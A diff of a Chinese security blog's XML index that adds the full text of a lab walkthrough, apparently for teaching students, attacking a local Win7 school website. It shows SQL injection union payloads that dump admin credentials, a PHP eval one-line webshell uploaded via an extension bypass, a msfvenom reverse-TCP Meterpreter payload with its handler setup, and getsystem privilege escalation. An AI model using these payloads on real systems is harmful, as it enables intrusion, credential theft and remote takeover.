-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%7BRYDZJ0T4EZ%29FABTKYE5%24J.png" alt=""><br>
-然后发送数据包<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CC8K%256%7DFP%7DHA%5B2ZUFJP%5DDGE.png" alt=""><br>
-ok，已经上传成功，我们去找找我们上传后的路径<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/V8TW%7BRFNJ%40VVQ6ESZK60QYG.png" alt=""><br>
-得到我们的上传完整路径为：<code>http://192.168.1.167/yxlink/img/img_3699336993.php</code><br>
-我们使用蚁剑进行连接我们上传的木马<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2_%5DLX62PYEDGHMP%6094SYA%29P.png" alt=""><br>
-成功连接，进入到对方服务器<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/QN_%60%5BB%5BTHV18Z1QFL3L%5B9EP.png" alt=""><br>
-到此，已成功拿到webshell</p>
-<h1>反弹shell连接</h1>
-<p>接下来我们利用kali的msf制作一个exe类型的反弹型木马</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=kali的ip LPORT=端口 -f 类型 -o 文件名</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/YDU1EFKR~H3D%28U6OD6X%7DZ%25U.png" alt=""><br>
-把做好的木马，通过我们蚁剑刚刚连接的webshell进行上传<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/KUOL~L7CL4S%40%60GJXYIUU%295R.png" alt=""><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/L%25%40S3%5DE_A%40CF3_%251DUDNP%5BS.png" alt=""><br>
-上传成功后，我们在kali启动msf<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/B%7B%40%40%607%604Y~JIBZFXIR4VC7O.png" alt=""></p>
-<p><strong>执行监听</strong></p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.131</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9H%28VN~3CT57WQ1%7DL1MUQ_%7DB.png" alt=""><br>
-<strong>执行木马</strong></p>
-<p>msf开启监听之后，我们去蚁剑webshell执行我们上传的木马<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%5B%29C3QY%60V%7BV%282%29TRB%40VM7SBH.png" alt=""><br>
-执行之后，回到kali，我们可以看到msf目标正在回连，创建Meterpreter会话成功<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/SIL%25NM%29X3G%293%5DZ4%25S1F%28BCF.png" alt=""></p>
-<p><strong>提权</strong></p>
-<p>首先查看一下我们的用户权限<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%60H_A1%29K4%5DH3FWZ8FHFQDSMP.png" alt=""><br>
-发现是普通用户权限，之前我们已经在webshell观察到对方是win7系统，所以我们采用的是windows的载荷攻击<br>
-我们尝试使用getsystem进行提权试试<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/6%24I2J%24V91AJ%5D8RJDYHFLMNS.png" alt=""><br>
-发现直接提权成功，现在我们拥有windows最高权限system<br>
-接下来我们打印一下系统信息，并且拍照对方电脑现在状态<br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/J8EE_%249FD%258GQ0%28%257%60%60BX14.png" alt=""><br>
-<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CW%7BXP%7D_1%25%5BI6P8M%40M23J4SQ.png" alt=""><br>
-ok，成功。</p>
-<h1>结语</h1>
-<p>在拿到system权限之后，我们可以干很多很多的事…例如给对方种下后门，拿来当肉鸡等等。。。<br>
-这告诉我们开发网站必须注重安全，否则带来的后果是无穷大的。<br>
-emmm…这波有点难受。</p>
-<p><strong>注：本博客仅供技术研究，若将其信息做其他用途，由用户承担全部法律及连带责任，本博客不承担任何法律及连带责任，请遵守中华人民共和国安全法</strong></p>
-]]></content>
-      <tags>
-        <tag>渗透</tag>
       </tags>
   </entry>
   <entry>
@@ -5012,6 +4856,134 @@ flag在根目录下获得😀<br>
 <img src="https://blog-file-1302856486.file.myqcloud.com/%E6%B5%85%E8%B0%88src%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%89%B9%E9%87%8F%E6%8C%96%E6%8E%98/12.png" alt=""></p>
 <h2 id="结尾"><a class="header-anchor" href="#结尾">¶</a>结尾</h2>
 <p>文中所写脚本还处于勉强能用的状态，后续会进行优化更改。师傅们如有需要也可选择自行更改。</p>
+]]></content>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>模拟网站攻击到提权的全部过程</title>
+    <url>/posts/46463/</url>
+    <content><![CDATA[<h1>前言</h1>
+<p>今天去给新一届的学生演示一次网站拿webshell到系统提权的过程，但不幸的是中间翻车了，老年人紧张得忘记了msf监听木马的指令，然后哆哆嗦嗦的在大家眼下，打开了笔记查看一下2333…所以更新一下博客，给自己一个教训QWQ。</p>
+<h1>准备工作</h1>
+<p>靶机（被攻击方）：win7系统<br>
+入侵者（攻击方）：win10系统、kali系统</p>
+<p>首先启动win7系统，搭建一个常见的校园网站，然后映射到局域网，使得我们能正常访问<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EUAM0%5DFV1UHQ43O%246FPAM11.png" alt=""></p>
+<h1>从网站拿到webshell</h1>
+<h2 id="sql注入漏洞"><a class="header-anchor" href="#sql注入漏洞">¶</a>sql注入漏洞</h2>
+<p>把整个网站浏览完一遍后，我们发现这里的url为?id=10结尾，我们猜测可能是一个sql注入点<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%28BBF9%7B%40%60VK%5DJ5YB59PLDC8.png" alt=""><br>
+首先我们在id=10后面加上一个单引号’进行判断<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%7DR0SQC6%40%25D0%24UCQD%28%7B_JBJB.png" alt=""><br>
+这个时候我们发现回显的数据不正常，于是我们再加一个注释符号<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EY%24%60%7BQF%5BOL_7B%7D1490~0NFR.png" alt=""><br>
+发现数据这个时候回显的时候是正常的，到这一步我们已经可以确定这里存在一个sql注入漏洞</p>
+<blockquote>
+<p>原理我们可以简单解释一下<br>
+在网站中，我们一般使用数据库存储网站数据，网站和数据库是存在一个交互性。网站所呈现的内容是由代码中写入的sql语句调用数据库中的内容进行一个呈现，例如我们刚刚看到的文字。<br>
+而sql注入漏洞一般是由于程序员书写的sql语句不规范所导致的安全事件。</p>
+</blockquote>
+<p>例如网站源码中使用如下的sql语句进行查询<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/1T2AQDR%295S%5B5%5D5%28FBQV%29EU3.png" alt=""><br>
+给语句结尾的where查询条件加上一个单引号’<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9YFRLV58FSE9%605E%405%7B3F_%25W.png" alt=""><br>
+很显然，我们传入的单引号和前面的单引号闭合，后面只有一个无法成对的单引号，然后报了语法错误。这个时候我们再加上<code>--+</code>注释符号注释掉后面的单引号<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/GSUAC7X6IS9%40_SDTJL%5DO4%60J.png" alt=""><br>
+这个时候查询的数据就会正确回显出来。</p>
+<p>原理简单解释了一下之后，我们回到刚刚的网站。<br>
+这个时候我们发现存在sql注入漏洞之后，我们就开始进行查询对方网站数据库的数据，找到一些敏感信息，例如管理员的账号密码等等</p>
+<p>首先，我们使用order by语句快速猜解出表中的列数<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CZATPZQ%249%293I4%5DQCRB%7BR9G3.png" alt=""><br>
+发现10列的时候报错，说明不足10列，我们继续缩小范围<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/JT6AZ1LLFZHL%4039EJE8OQ3E.png" alt=""><br>
+再查询第8列的时候，发现数据回显正确，说明对方表中含有列数8<br>
+我们使用union select 自定义查询测试一下，注意我们这里前面的id=10，要写成id=-10，把这里的查询置空<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/W8%25J%40U4%7D%5BD3HFH%7DNFML%25L_7.png" alt=""><br>
+发现会分别回显第三列、第五列和第七列。接下来我们就可以在三、五、七处做做文章</p>
+<p>查询数据库名字：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.167</span><span class="operator">/</span>yxlink<span class="operator">/</span>tuku<span class="operator">/</span>images.php?id<span class="operator">=</span><span class="number">-10</span><span class="string">&#x27; union select 1,2,database(),4,5,6,7,8--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EXY%40U7T%25JGYM6%25%7BD0G%29FZF0.png" alt=""><br>
+得到数据库名字：qzn_zuiai</p>
+<p>查询数据库中的表名：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.167</span><span class="operator">/</span>yxlink<span class="operator">/</span>tuku<span class="operator">/</span>images.php?id<span class="operator">=</span><span class="number">-10</span><span class="string">&#x27; union select 1,2,group_concat(table_name),4,5,6,7,8 from information_schema.tables where table_schema=&quot;qzn_zuiai&quot;--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/64LOR%40WXDA7PCL2%5B8%40OWSJG.png" alt=""><br>
+得到一共se2admin,se2fl,se2hd,se2nr,se2tufl,se2tunr,se2wz,se2zf,sj3sk九张表<br>
+通过表名，我们猜测se2admin可能是存储管理员账号和密码的表，所以我们先查询这张表中的数据</p>
+<p>查询表se2admin中的字段：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.167</span><span class="operator">/</span>yxlink<span class="operator">/</span>tuku<span class="operator">/</span>images.php?id<span class="operator">=</span><span class="number">-10</span><span class="string">&#x27; union select 1,2,group_concat(column_name),4,5,6,7,8 from information_schema.columns where table_name=&quot;se2admin&quot;--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2%24%60DI0KVJHJM5MK_S%29SZ~%40U.png" alt=""><br>
+得到表中的字段值有id，name，pass等，接下来我们查询name和pass的字段值</p>
+<p>查询字段值：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.167</span><span class="operator">/</span>yxlink<span class="operator">/</span>tuku<span class="operator">/</span>images.php?id<span class="operator">=</span><span class="number">-10</span><span class="string">&#x27; union select 1,2,name,4,pass,6,7,8 from se2admin--+</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/DNM1KIWQ3~%29TL03T%408%5D9G%60X.png" alt=""><br>
+我们得到管理员账号：admin，管理员账号密码：7fef6171469e80d32c0559f88b377245<br>
+很显然密码值是被加密的md5值，所以我们去网上找md5网站进行撞库查询<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/N%29%5DIF%40X%25H%29789%7B~MNS6K0%5BY.png" alt=""><br>
+得到管理员密码为：admin888<br>
+接下来我们需要查找这个网站的后台地址，我们使用御剑进行一个扫描<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/OV8QOF%25%7D6CVVLGW_5TQ1%5DTN.png" alt=""><br>
+御剑爆出了很多敏感地址，我们找到一个admin的目录，可能是后台地址，我们去访问一下<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/HCYIQ8PD4F%7BU5KVUEVY%7D9WG.png" alt=""><br>
+输入我们刚刚得到的管理员账号和密码admin:admin888<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P%40R%7BB8STI811URPWC%25%40GQ81.png" alt=""><br>
+这个时候，我们成功进入对方网站后台。</p>
+<h2 id="文件上传漏洞"><a class="header-anchor" href="#文件上传漏洞">¶</a>文件上传漏洞</h2>
+<p>接下来我们再这里找到一个文件上传点<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/A%28GNMR3D%29O%60%29AH3MKVRQ20U.png" alt=""><br>
+我们写一个简单的一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/H6JI8CKP%256M_8%5BFOZ1_VKUS.png" alt=""><br>
+考虑到这里可能会对我们上传的文件进行一个后缀限制，例如只能上传jpg或者png图片格式文件等，所以我们把muma.txt改成muma.jpg格式<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P0S3ZG_4XI%29%7BGX14%25RQRYUA.png" alt=""><br>
+我们开启burpsuite，然后点提交，拦截到我们发送的数据包<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/FK_UC_0%25I%40Q~16XJN7%5B%601CQ.png" alt=""><br>
+我们把muma.jpg改回php文件类型：muma.php<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%7BRYDZJ0T4EZ%29FABTKYE5%24J.png" alt=""><br>
+然后发送数据包<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CC8K%256%7DFP%7DHA%5B2ZUFJP%5DDGE.png" alt=""><br>
+ok，已经上传成功，我们去找找我们上传后的路径<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/V8TW%7BRFNJ%40VVQ6ESZK60QYG.png" alt=""><br>
+得到我们的上传完整路径为：<code>http://192.168.1.167/yxlink/img/img_3699336993.php</code><br>
+我们使用蚁剑进行连接我们上传的木马<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2_%5DLX62PYEDGHMP%6094SYA%29P.png" alt=""><br>
+成功连接，进入到对方服务器<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/QN_%60%5BB%5BTHV18Z1QFL3L%5B9EP.png" alt=""><br>
+到此，已成功拿到webshell</p>
+<h1>反弹shell连接</h1>
+<p>接下来我们利用kali的msf制作一个exe类型的反弹型木马</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=kali的ip LPORT=端口 -f 类型 -o 文件名</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/YDU1EFKR~H3D%28U6OD6X%7DZ%25U.png" alt=""><br>
+把做好的木马，通过我们蚁剑刚刚连接的webshell进行上传<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/KUOL~L7CL4S%40%60GJXYIUU%295R.png" alt=""><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/L%25%40S3%5DE_A%40CF3_%251DUDNP%5BS.png" alt=""><br>
+上传成功后，我们在kali启动msf<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/B%7B%40%40%607%604Y~JIBZFXIR4VC7O.png" alt=""></p>
+<p><strong>执行监听</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.131</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9H%28VN~3CT57WQ1%7DL1MUQ_%7DB.png" alt=""><br>
+<strong>执行木马</strong></p>
+<p>msf开启监听之后，我们去蚁剑webshell执行我们上传的木马<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%5B%29C3QY%60V%7BV%282%29TRB%40VM7SBH.png" alt=""><br>
+执行之后，回到kali，我们可以看到msf目标正在回连，创建Meterpreter会话成功<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/SIL%25NM%29X3G%293%5DZ4%25S1F%28BCF.png" alt=""></p>
+<p><strong>提权</strong></p>
+<p>首先查看一下我们的用户权限<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%60H_A1%29K4%5DH3FWZ8FHFQDSMP.png" alt=""><br>
+发现是普通用户权限，之前我们已经在webshell观察到对方是win7系统，所以我们采用的是windows的载荷攻击<br>
+我们尝试使用getsystem进行提权试试<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/6%24I2J%24V91AJ%5D8RJDYHFLMNS.png" alt=""><br>
+发现直接提权成功，现在我们拥有windows最高权限system<br>
+接下来我们打印一下系统信息，并且拍照对方电脑现在状态<br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/J8EE_%249FD%258GQ0%28%257%60%60BX14.png" alt=""><br>
+<img src="https://blog-file-1302856486.file.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CW%7BXP%7D_1%25%5BI6P8M%40M23J4SQ.png" alt=""><br>
+ok，成功。</p>
+<h1>结语</h1>
+<p>在拿到system权限之后，我们可以干很多很多的事…例如给对方种下后门，拿来当肉鸡等等。。。<br>
+这告诉我们开发网站必须注重安全，否则带来的后果是无穷大的。<br>
+emmm…这波有点难受。</p>
+<p><strong>注：本博客仅供技术研究，若将其信息做其他用途，由用户承担全部法律及连带责任，本博客不承担任何法律及连带责任，请遵守中华人民共和国安全法</strong></p>
 ]]></content>
       <tags>
         <tag>渗透</tag>
